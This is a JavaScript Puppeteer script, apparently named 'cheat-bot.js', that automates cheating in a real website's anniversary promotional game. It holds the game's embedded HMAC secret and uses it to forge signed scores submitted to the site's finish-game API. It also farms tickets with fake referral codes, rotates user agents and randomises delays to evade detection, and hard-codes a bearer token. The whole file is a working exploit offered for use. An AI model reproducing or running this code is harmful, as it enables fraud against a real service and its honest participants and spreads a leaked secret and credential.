const puppeteer = require('puppeteer');

// ============ USER AGENTS ============
const USER_AGENTS = {
  // windows: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
  // macos: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
  // linux: 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
  android: 'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36',
  iphone: 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
  ipad: 'Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
  samsung: 'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36',
  // edge: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 Edg/142.0.0.0',
  // firefox: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0',
  // safari: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
};

// Get random user agent
function getRandomUserAgent() {
  const keys = Object.keys(USER_AGENTS);
  return USER_AGENTS[keys[Math.floor(Math.random() * keys.length)]];
}

// Resolve user agent from key or use custom string
function resolveUserAgent(ua) {
  if (!ua || ua === 'random') return getRandomUserAgent();
  if (USER_AGENTS[ua.toLowerCase()]) return USER_AGENTS[ua.toLowerCase()];
  return ua; // Custom user agent string
}

// ============ CONFIGURATION ============
// Usage: node cheat-bot.js [token] [userAgent]
// userAgent options: windows, macos, linux, android, iphone, ipad, samsung, edge, firefox, safari, random
const SCORE_STEP = 500; // Each item gives 500 points

const CONFIG = {
  token: process.argv[2] || '531044|dcDVMJQaz23Q707h5UKYE8vQYzZxiFuBCSMROo8S7d05bcee',
  userAgent: resolveUserAgent(process.argv[3] || 'random'),
  targetScore: 46000000,        // Stop when total score reaches this (must be multiple of SCORE_STEP)
  delayMin: 3,                  // Minimum delay between runs (seconds)
  delayMax: 5,                  // Maximum delay between runs (seconds)
  rateMin: 800,                 // Minimum score rate (points per second)
  rateMax: 1000,                 // Maximum score rate (points per second)
  durationMin: 50,              // Min game duration (seconds)
  durationMax: 200,             // Max game duration (seconds)
  headless: true,               // Set true to run without browser window
};

// Validate targetScore is a multiple of SCORE_STEP
if (CONFIG.targetScore % SCORE_STEP !== 0) {
  console.error(`❌ Error: targetScore (${CONFIG.targetScore}) must be a multiple of ${SCORE_STEP}`);
  process.exit(1);
}

// ============ HELPER FUNCTIONS ============
function randomInt(min, max, step = 1) {
  const range = Math.floor((max - min) / step);
  return min + Math.floor(Math.random() * (range + 1)) * step;
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// Referral API call to get coins/ticket
async function doReferral(page, token) {
  const result = await page.evaluate(async (tkn) => {
    const response = await fetch('https://landing.emofid.com/api-service/anniversary40/actions/', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${tkn}`
      },
      credentials: 'include',
      body: JSON.stringify({
        mission_name: 'referral',
        referral_code: `${Math.random().toString(36).slice(2).toUpperCase()}${Date.now().toString(36)}`
      })
    });
    return response.json();
  }, token);
  return result;
}

// Get actual user score from API
async function getUserScore(page, token) {
  const result = await page.evaluate(async (tkn) => {
    const response = await fetch('https://landing.emofid.com/api-service/anniversary40/user/', {
      method: 'GET',
      headers: {
        'Authorization': `Bearer ${tkn}`
      },
      credentials: 'include'
    });
    const data = await response.json();
    return parseFloat(data.data.scores[0].points);
  }, token);
  return result;
}

// ============ EXPLOIT SCRIPT (runs in browser) ============
// Uses actual elapsed time and same nonce for both Score and Cat
const exploitScript = (score, token, gameStartTime) => `
(async () => {
  const A40_NINAI = 'A40@2025-ASDasd!@#123CCCvvvaaa';

  // Calculate actual elapsed time since game started
  const duration = (Date.now() - ${gameStartTime}) / 1000;
  const cat = Math.floor(duration * 0.97);

  // Use SAME nonce for both Score and Cat (server validates this)
  const nonce = Date.now().toString();

  async function encodeValueWithNonce(value, nonce) {
    const encoder = new TextEncoder();
    const key = await crypto.subtle.importKey(
      'raw',
      encoder.encode(A40_NINAI),
      { name: 'HMAC', hash: 'SHA-256' },
      false,
      ['sign']
    );

    const payload = value + '.' + nonce;
    const signature = await crypto.subtle.sign('HMAC', key, encoder.encode(payload));
    const hex = Array.from(new Uint8Array(signature))
      .map(b => b.toString(16).padStart(2, '0')).join('');

    return btoa(payload + '.' + hex);
  }

  const fakePoints = await encodeValueWithNonce(${score}, nonce);
  const fakeCat = await encodeValueWithNonce(cat, nonce);

  const response = await fetch('https://landing.emofid.com/api-service/anniversary40/finish-game/', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Authorization': 'Bearer ${token}',
      'what': fakeCat
    },
    credentials: 'include',
    body: JSON.stringify({
      points_earned: fakePoints,
      mission_name: 'rocket',
      duration: duration
    })
  });

  const result = await response.json();
  return { ...result, duration, cat };
})();
`;

// ============ MAIN BOT ============
async function runBot() {
  console.log('🚀 Game Cheat Bot\n');

  const token = CONFIG.token;
  const targetScore = CONFIG.targetScore;
  let totalScore = 0;
  let gameCount = 0;

  console.log(`✅ Token: ${token.substring(0, 10)}...`);
  console.log(`✅ Target Score: ${targetScore.toLocaleString()}`);
  console.log(`✅ Score rate: ${CONFIG.rateMin} - ${CONFIG.rateMax} pts/sec`);
  console.log(`✅ Duration range: ${CONFIG.durationMin}s - ${CONFIG.durationMax}s`);
  console.log(`✅ Delay range: ${CONFIG.delayMin}s - ${CONFIG.delayMax}s\n`);

  const browser = await puppeteer.launch({
    headless: CONFIG.headless,
    defaultViewport: null,
    args: ['--start-maximized', '--no-sandbox', '--disable-setuid-sandbox']
  });

  const page = await browser.newPage();

  // Set User-Agent
  await page.setUserAgent(CONFIG.userAgent);
  console.log(`✅ User-Agent: ${CONFIG.userAgent.substring(0, 50)}...`);

  // First navigate to set up the domain
  console.log('🔐 Setting up authentication...');
  await page.goto('https://landing.emofid.com/anniversary40/', {
    waitUntil: 'networkidle2',
    timeout: 60000
  });

  // Set cookie
  await page.setCookie({
    name: 'anniversary40_token',
    value: token,
    domain: '.landing.emofid.com',
    path: '/',
  });

  // Set localStorage
  await page.evaluate((tkn) => {
    localStorage.setItem('auth-storage', JSON.stringify({
      state: {
        token: tkn,
        user: {}
      },
      version: 0
    }));
    localStorage.setItem('anniversary40_intro_seen', 'true');
  }, token);

  // Reload to apply auth
  await page.reload({ waitUntil: 'networkidle2' });
  console.log('✅ Authentication set!\n');

  // Get initial score from API
  totalScore = await getUserScore(page, token);
  console.log(`📊 Current score on site: ${totalScore.toLocaleString()}\n`);

  while (totalScore < targetScore) {
    gameCount++;
    const remaining = targetScore - totalScore;
    console.log(`\n========== GAME ${gameCount} | Total: ${totalScore.toLocaleString()} / ${targetScore.toLocaleString()} (${remaining.toLocaleString()} remaining) ==========`);

    try {
      // Generate random duration and rate
      const targetDuration = randomInt(CONFIG.durationMin, CONFIG.durationMax);
      const rate = randomInt(CONFIG.rateMin, CONFIG.rateMax);

      // Calculate score from duration * rate (rounded to nearest SCORE_STEP)
      const score = Math.round((targetDuration * rate) / SCORE_STEP) * SCORE_STEP;

      console.log(`⏱️  Target Duration: ${targetDuration}s`);
      console.log(`📈 Rate: ${rate} pts/sec`);
      console.log(`📊 Target Score: ${score.toLocaleString()} (${targetDuration}s × ${rate})`);

      // Do 1 referral to get ticket
      console.log('🎫 Getting ticket via referral...');
      const referralResult = await doReferral(page, token);
      if (referralResult && referralResult.success) {
        console.log('✅ Referral: +10 coins');
      } else {
        console.log('⚠️  Referral:', referralResult?.message || 'Unknown response');
      }

      // Navigate to games page
      console.log('🌐 Navigating to games page...');
      await page.goto('https://landing.emofid.com/anniversary40/games/', {
        waitUntil: 'networkidle2',
        timeout: 60000
      });

      // Wait for and click the start game button
      console.log('🎮 Clicking start game button...');
      await page.waitForSelector('button[aria-label*="شروع بازی شاتل فضایی"]', { timeout: 30000 });

      // Set up listener for can-start API before clicking
      const canStartPromise = page.waitForResponse(
        response => response.url().includes('/api-service/anniversary40/can-start') && response.status() === 200,
        { timeout: 60000 }
      ).catch(() => null);

      await page.click('button[aria-label*="شروع بازی شاتل فضایی"]');

      // Wait for iframe to load
      console.log('⏳ Waiting for game iframe to load...');
      await page.waitForSelector('iframe[src*="games/rocket"]', { timeout: 15000 });

      // Wait for can-start API to complete
      console.log('⏳ Waiting for game to initialize (can-start API)...');
      const canStartResult = await canStartPromise;

      // Record the ACTUAL start time (this is crucial for the exploit)
      const gameStartTime = Date.now();

      if (canStartResult) {
        console.log('✅ Game initialized!');
      } else {
        console.log('⚠️  can-start timeout, continuing anyway...');
      }

      await sleep(2000); // Wait for game to be ready

      // Get the game iframe
      const frames = page.frames();
      const gameFrame = frames.find(f => f.url().includes('games/rocket'));

      if (!gameFrame) {
        console.log('❌ Game iframe not found!');
        continue;
      }

      // Wait for the target duration (server validates actual elapsed time)
      console.log(`⏳ Waiting ${targetDuration} seconds (server validates elapsed time)...`);
      await sleep(targetDuration * 1000);

      // Execute exploit in iframe context with actual start time
      console.log('💉 Executing exploit...');
      const result = await gameFrame.evaluate(exploitScript(score, token, gameStartTime));

      if (result && result.success) {
        console.log(`✅ Success: +${score.toLocaleString()} points`);
        console.log(`   Duration: ${result.duration?.toFixed(2)}s | Cat: ${result.cat}`);
        // Get actual score from API
        totalScore = await getUserScore(page, token);
        console.log(`📈 Total (from site): ${totalScore.toLocaleString()} / ${targetScore.toLocaleString()}`);
      } else {
        console.log('❌ Failed:', result);
      }

      // Click close button
      console.log('🔙 Closing game...');
      await page.waitForSelector('button[aria-label="بستن بازی"]', { timeout: 5000 });
      await page.click('button[aria-label="بستن بازی"]');
      await sleep(1000);

      // Random delay before next game (if not reached target yet)
      if (totalScore < targetScore) {
        const delay = randomInt(CONFIG.delayMin, CONFIG.delayMax);
        console.log(`⏰ Waiting ${delay} seconds before next run...`);
        await sleep(delay * 1000);
      }

    } catch (error) {
      console.log('❌ Error in loop:', error.message);
      // Try to recover by going back to games page
      await page.goto('https://landing.emofid.com/anniversary40/games/').catch(() => {});
      await sleep(2000);
    }
  }

  // Get final score from API
  const finalScore = await getUserScore(page, token);

  console.log('\n🏁 Bot finished!');
  console.log(`📊 Total games: ${gameCount}`);
  console.log(`📈 Final score (from site): ${finalScore.toLocaleString()}`);
  await browser.close();
}

// Run the bot
runBot().catch(console.error);
